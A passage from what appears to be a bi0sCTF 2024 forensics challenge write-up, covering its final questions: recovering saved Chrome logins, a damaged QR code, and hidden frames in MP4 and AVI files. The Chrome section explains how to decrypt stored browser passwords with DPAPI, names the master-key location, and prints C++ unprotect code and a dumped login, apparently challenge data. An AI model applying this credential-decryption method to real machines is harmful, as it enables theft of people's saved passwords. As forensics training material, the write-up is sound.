+<p>now let&rsquo;s go to the pastebin and unlcok it with the password in notepad++ backup <code>PFA6}&gt;C&quot;lbqUUX1M5i;J</code></p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-137.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<pre tabindex="0"><code>wO0`7A7L9Wp|?Y&lt;^G
+</code></pre><pre tabindex="0"><code>1af43ebd3fe46a870f2bca51c525af76_b8df2e33554bbbf7e58c793ed2e401a1
+</code></pre><h4 class="group head-tag" id="question-8">Question 8<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-8"></a></h4><p>Q8) What is the email and password for his traboda login?
+Format: email_password</p>
+<p>now we can decrypt the chrome passwords with editing this 
+<a
+  href="https://github.com/ohyicong/decrypt-chrome-passwords.git"
+  
+    target="_blank"
+  
+  >tool</a
+>
+</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-135.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>we can also get the dpapi from %APPDATA%\Microsoft\Protect{SID}</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-147.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>and we can use the custom unprotectdata to get the secretkey</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;pch.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;dpapi.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">DATA_BLOB</span> <span class="n">plainBlob</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="n">DATA_BLOB</span> <span class="n">encryptedBlob</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="n">BYTE</span> <span class="n">dataBytes</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;spotless&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">BYTE</span> <span class="n">inBytes</span><span class="p">[</span><span class="mi">300</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="n">BYTE</span> <span class="n">outBytes</span><span class="p">[</span><span class="mi">300</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">outFile</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;c:</span><span class="se">\\</span><span class="s">users</span><span class="se">\\</span><span class="s">mantvydas</span><span class="se">\\</span><span class="s">desktop</span><span class="se">\\</span><span class="s">encrypted.bin&#34;</span><span class="p">,</span> <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CREATE_ALWAYS</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">inFile</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;c:</span><span class="se">\\</span><span class="s">users</span><span class="se">\\</span><span class="s">mantvydas</span><span class="se">\\</span><span class="s">desktop</span><span class="se">\\</span><span class="s">spotless.bin&#34;</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">DWORD</span> <span class="n">fileSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">//encrypt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">plainBlob</span><span class="p">.</span><span class="n">pbData</span> <span class="o">=</span> <span class="n">dataBytes</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">plainBlob</span><span class="p">.</span><span class="n">cbData</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dataBytes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">CryptProtectData</span><span class="p">(</span><span class="o">&amp;</span><span class="n">plainBlob</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CRYPTPROTECT_LOCAL_MACHINE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">encryptedBlob</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">WriteFile</span><span class="p">(</span><span class="n">outFile</span><span class="p">,</span> <span class="n">encryptedBlob</span><span class="p">.</span><span class="n">pbData</span><span class="p">,</span> <span class="n">encryptedBlob</span><span class="p">.</span><span class="n">cbData</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="c1">//decrypt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">fileSize</span> <span class="o">=</span> <span class="n">GetFileSize</span><span class="p">(</span><span class="n">inFile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">ReadFile</span><span class="p">(</span><span class="n">inFile</span><span class="p">,</span> <span class="n">encryptedBlob</span><span class="p">.</span><span class="n">pbData</span><span class="p">,</span> <span class="n">fileSize</span> <span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">encryptedBlob</span><span class="p">.</span><span class="n">cbData</span> <span class="o">=</span> <span class="n">fileSize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">CryptUnprotectData</span><span class="p">(</span><span class="o">&amp;</span><span class="n">encryptedBlob</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">plainBlob</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><pre tabindex="0"><code>E:\writeup\bat3\User Data\Default\Login Data
+Sequence: 1
+URL: https://app.traboda.com/academy
+User Name: jeanpaulvalley33@gmail.com
+Password: 3mZxVDpGUhnm2LL
+
+**************************************************
+Sequence: 2
+URL: https://ctflearn.com/user/register
+User Name: DukeThomas
+Password: fakeflaghere:/
+
+**************************************************
+</code></pre><pre tabindex="0"><code>jeanpaulvalley33@gmail.com_3mZxVDpGUhnm2LL
+</code></pre><h4 class="group head-tag" id="question-9">Question 9<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-9"></a></h4><p>Q9) What is the suspicious hidden text in the QR?
+Format: md5(text)</p>
+<p>for this I extarcted all the images that are numbered as my test image which was 15.png.azr43l and was a qr</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-138.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-140.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>out of which 15.png looked more suspiicious and as well was more damaged than the rest of the qrs, so we can use any tool to recover it by replacing their positions and adding the squatre and we can contruct it.</p>
+<p>after this we get</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-139.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<pre tabindex="0"><code>QR-Code:k4YSM|5^#?34SB$q
+</code></pre><pre tabindex="0"><code>73327e080755e5f7e5ae18a1a4338268
+</code></pre><h4 class="group head-tag" id="question-10">Question 10<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-10"></a></h4><p>Q10) What is the hidden text in the MP4?
+Format: md5(text)</p>
+<p>now we can decrypt the mp4 and we can use any mp4 check or by template, the only problem we will see is that the mp4 size is wrong, so we calculate the size and change it.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-143.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-144.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>we get this around 1:40 and this can be either done manually or with scripted with msec or other parameters.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-145.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<pre tabindex="0"><code>d774c3a1cbe3d146c20e4142a8361609
+</code></pre><h4 class="group head-tag" id="question-11">Question 11<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-11"></a></h4><p>Q11) What is the hidden text in the AVI file?
+Format: md5(text)</p>
+<p>On playing the video file, it looks like frames are shuffled.</p>
+<p>The compression may be H.264 or MPEG-4. So, there might be I-frames &amp; P-frames.</p>
+<p>So, we can extract the I-frame from every one second (that contains 30 frames).</p>
+<p>But how to find I-frames. Usually, I-frames are larger in size. So, we can parse the video file and locate the bigger chunk and extract it.</p>
+<p>There is some text at <code>2:33</code>.</p>
+<p>Way to get the content</p>
+<ul>
+<li>
+<p>reduce the playback speed and you can see the frame.</p>
+</li>
+<li>
+<p>Extract all I-frames video and craft a new video file.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">FRAME_SIZE</span> <span class="o">=</span> <span class="mi">6362</span>
+</span></span><span class="line"><span class="cl"><span class="n">FRMAE_RATE</span> <span class="o">=</span> <span class="mi">30</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">save_it</span><span class="p">(</span><span class="n">buff</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;redued.avi&#34;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buff</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shuffle_frame</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">buffer</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span><span class="o">=</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">FRAME_SIZE</span> <span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">TEMP_BUFF</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">SIZE</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">entire_buff</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>    
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">FRMAE_RATE</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ref</span> <span class="o">=</span> <span class="n">buff</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mh">0x04</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">ref</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x30\x30\x64\x63</span><span class="s1">&#39;</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">                    <span class="n">atsize</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span> <span class="n">buff</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mh">0x04</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">low_bytes</span> <span class="o">=</span> <span class="n">atsize</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">SIZE</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">low_bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">atsize</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">atsize</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">entire_buff</span> <span class="o">=</span> <span class="n">ref</span> <span class="o">+</span> <span class="n">low_bytes</span> <span class="o">+</span><span class="n">buff</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">atsize</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="n">TEMP_BUFF</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">entire_buff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sizes</span> <span class="o">=</span> <span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">TEMP_BUFF</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">k</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">sizes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pos</span> <span class="o">=</span> <span class="n">sizes</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">buffer</span> <span class="o">+=</span> <span class="n">TEMP_BUFF</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">i</span><span class="o">+=</span><span class="mi">1</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span> <span class="n">save_it</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">buffer</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;chall.avi&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">buffer</span> <span class="o">+=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mh">0x162e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">shuffle_frame</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">buffer</span><span class="p">)</span>
+</span></span></code></pre></div>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-146.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<pre tabindex="0"><code>1c7cfa806f06fb78687d26814260b874
+</code></pre><h3 class="group head-tag" id="flag">flag<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#flag"></a></h3><pre tabindex="0"><code>bi0sCTF{Th3_St_Dum4s_can&#39;t_contr0l_th1s_Arch4ng3l_0f_V3ng3nc3_Anym0r3_Rahhh_b63f816}
+</code></pre><h2 class="group head-tag" id="closing-note">Closing Note<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#closing-note"></a></h2><p>Thank you to everyone who tried the challenge and Congratulations Team idek for attaining the only solve on this. We thank you for playing the CTF and would love to hear some feedback about the challenge. Thank you 
+<a
+  href="https://twitter.com/_retr0ds_"
+  
+    target="_blank"
+  
+  >Retr0ds</a
+>
+ for helping me test the challenge and writing the writeup.
+If you have any queries regarding the challenge, feel free to hit me up over twitter/discord.</p>
+<p><strong>Contact</strong>: Azr43lKn1ght | 
+<a
+  href="https://twitter.com/Azr43lKn1ght"
+  
+    target="_blank"
+  
+  >twitter</a
+>
+ | 
+<a
+  href="https://www.linkedin.com/in/azr43lkn1ght?utm_source=share&amp;utm_campaign=share_via&amp;utm_content=profile&amp;utm_medium=android_app"
+  
+    target="_blank"
+  
+  >Linkedin</a
+>
+ | 
+<a
+  href="https://github.com/Azr43lKn1ght"
+  
+    target="_blank"
+  
+  >github</a
+>
+</p>
+
+        </div>
+
+        
+        <div
+          class="flex flex-col justify-start px-1 pb-5 pt-1 md:px-3 lg:flex-row lg:justify-between lg:px-10">
+          
+          
+          
+            <div class="flex flex-row flex-wrap items-center">
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/bi0sctf/"
+                  >Bi0sCTF</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/bi0sctf2024/"
+                  >Bi0sctf2024</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/ransomware/"
+                  >Ransomware</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/threat-hunting/"
+                  >Threat Hunting</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/ransomware-analysis/"
+                  >Ransomware Analysis</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/ransomware-investigation/"
+                  >Ransomware Investigation</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/file-forensics/"
+                  >File Forensics</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/ransomware-recovery/"
+                  >Ransomware Recovery</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/reverse-engineering/"
+                  >Reverse Engineering</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/incident-response/"
+                  >Incident Response</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/malware-analysis/"
+                  >Malware Analysis</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/windows-forensics/"
+                  >Windows Forensics</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/browser-forensics/"
+                  >Browser Forensics</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/windbg-dump-debugging/"
+                  >WinDBG Dump Debugging</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/process-memory-analysis/"
+                  >Process Memory Analysis</a
+                >
+              
+            </div>
+          
+
+        </div>
+      </div>
+    </div>
+
+    
+    
+  </div>
+<div data-dial-init class="group fixed bottom-24 end-8 md:end-20">
+  <div
+    id="speed-dial-menu-bottom-right"
+    class="mb-4 flex hidden flex-col items-center space-y-2">
+    
+    
+      <button
+        id="to-top-button"
+        type="button"
+        data-tooltip-target="tooltip-top"
+        data-tooltip-placement="left"
+        class="flex hidden h-[52px] w-[52px] items-center justify-center rounded-full border border-gray-200 bg-white text-gray-500 shadow-sm hover:bg-gray-50 hover:text-gray-900 focus:outline-none focus:ring-4 focus:ring-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600 dark:hover:text-white dark:focus:ring-gray-400">
+        <svg
+          class="h-5 w-5"
+          aria-hidden="true"
+          fill="currentColor"
+          viewBox="0 0 1024 1024"
+          version="1.1"
+          xmlns="http://www.w3.org/2000/svg">
+          <path
+            d="M629.333333 853.333333h-234.666666c-17.066667 0-32 14.933333-32 32s14.933333 32 32 32h234.666666c17.066667 0 32-14.933333 32-32s-14.933333-32-32-32zM842.666667 360.533333L535.466667 113.066667c-12.8-8.533333-27.733333-8.533333-40.533334 0L183.466667 360.533333c-6.4 6.4-12.8 14.933333-12.8 23.466667 0 2.133333 0 6.4 2.133333 8.533333 2.133333 12.8 14.933333 21.333333 27.733333 21.333334h155.733334v236.8c0 19.2 12.8 29.866667 32 29.866666h249.6c21.333333 0 34.133333-12.8 34.133333-29.866666v-234.666667h151.466667c12.8 0 25.6-8.533333 27.733333-21.333333s0-25.6-8.533333-34.133334zM629.333333 746.666667h-234.666666c-17.066667 0-32 14.933333-32 32s14.933333 32 32 32h234.666666c17.066667 0 32-14.933333 32-32s-14.933333-32-32-32z"></path>
+        </svg>
+        <span class="sr-only">Top</span>
+      </button>
+      <div
+        id="tooltip-top"
+        role="tooltip"
+        class="tooltip invisible absolute z-10 inline-block w-auto rounded-lg bg-gray-900 px-3 py-2 text-sm font-medium text-white opacity-0 shadow-sm transition-opacity duration-300 dark:bg-gray-700">
+        Top
+        <div class="tooltip-arrow" data-popper-arrow></div>
+      </div>
+    
+
+    
+      
+      <button
+        type="button"
+        data-tooltip-target="tooltip-toc"
+        data-tooltip-placement="left"
+        data-drawer-target="drawer-body-scrolling-toc"
+        data-drawer-show="drawer-body-scrolling-toc"
+        data-drawer-body-scrolling="true"
+        aria-controls="drawer-body-scrolling-toc"
+        class="flex h-[52px] w-[52px] items-center justify-center rounded-full border border-gray-200 bg-white text-gray-500 shadow-sm hover:bg-gray-50 hover:text-gray-900 focus:outline-none focus:ring-4 focus:ring-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600 dark:hover:text-white dark:focus:ring-gray-400">
+        <svg
+          class="h-5 w-5"
+          aria-hidden="true"
+          xmlns="http://www.w3.org/2000/svg"
+          fill="currentColor"
+          viewBox="0 0 1024 1024"
+          version="1.1">
+          <path
+            d="M901.8 313.5H354.4c-32 0-58.2-26.2-58.2-58.2v-18.1c0-32 26.2-58.2 58.2-58.2h547.4c32 0 58.2 26.2 58.2 58.2v18.1c0 32-26.2 58.2-58.2 58.2z"></path>
+          <path
+            d="M131.3 246.2m-67.3 0a67.3 67.3 0 1 0 134.6 0 67.3 67.3 0 1 0-134.6 0Z"></path>
+          <path
+            d="M901.8 579.3H354.4c-32 0-58.2-26.2-58.2-58.2V503c0-32 26.2-58.2 58.2-58.2h547.4c32 0 58.2 26.2 58.2 58.2v18.1c0 32-26.2 58.2-58.2 58.2z"></path>
+          <path
+            d="M131.3 512m-67.3 0a67.3 67.3 0 1 0 134.6 0 67.3 67.3 0 1 0-134.6 0Z"></path>
+          <path
+            d="M901.8 845.1H354.4c-32 0-58.2-26.2-58.2-58.2v-18.1c0-32 26.2-58.2 58.2-58.2h547.4c32 0 58.2 26.2 58.2 58.2v18.1c0 32-26.2 58.2-58.2 58.2z"></path>
+          <path
+            d="M131.3 777.8m-67.3 0a67.3 67.3 0 1 0 134.6 0 67.3 67.3 0 1 0-134.6 0Z"></path>
+        </svg>
+
+        <span class="sr-only">Catelog</span>
+      </button>
+      <div
+        id="tooltip-toc"
+        role="tooltip"
+        class="tooltip invisible absolute z-10 inline-block w-auto rounded-lg bg-gray-900 px-3 py-2 text-sm font-medium text-white opacity-0 shadow-sm transition-opacity duration-300 dark:bg-gray-700">
+        Catelog
+        <div class="tooltip-arrow" data-popper-arrow></div>
+      </div>
+
+      
+      
+    
+
+
+    
+    <button
+      type="button"
+      data-drawer-target="drawer-body-scrolling"
+      data-drawer-show="drawer-body-scrolling"
+      data-drawer-body-scrolling="true"
+      aria-controls="drawer-body-scrolling"
+      data-tooltip-target="tooltip-tags"
+      data-tooltip-placement="left"
+      class="flex h-[52px] w-[52px] items-center justify-center rounded-full border border-gray-200 bg-white text-gray-500 shadow-sm hover:bg-gray-50 hover:text-gray-900 focus:outline-none focus:ring-4 focus:ring-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600 dark:hover:text-white dark:focus:ring-gray-400">
+      <svg
+        class="h-5 w-5"
+        aria-hidden="true"
+        fill="currentColor"
+        viewBox="0 0 1024 1024"
+        version="1.1"
+        xmlns="http://www.w3.org/2000/svg">
+        <path
+          d="M96.512 454.272h839.84a78.752 78.752 0 0 1 78.752 78.752v8.704a78.752 78.752 0 0 1-78.752 78.752H96.512a78.752 78.752 0 0 1-78.752-78.752v-8.704a78.752 78.752 0 0 1 78.752-78.752zM571.872 232.672H904.32a55.424 55.424 0 0 1 0 110.848H571.872a55.424 55.424 0 0 1 0-110.848zM350.208 731.36h332.448a55.424 55.424 0 0 1 0 110.848H350.208a55.424 55.424 0 0 1 0-110.848zM128.544 177.248h221.664a55.424 55.424 0 0 1 0 110.848H128.544a55.424 55.424 0 0 1 0-110.848z"
+          p-id="22696"></path>
+      </svg>
+      <span class="sr-only">Tags</span>
+    </button>
+    <div
+      id="tooltip-tags"
+      role="tooltip"
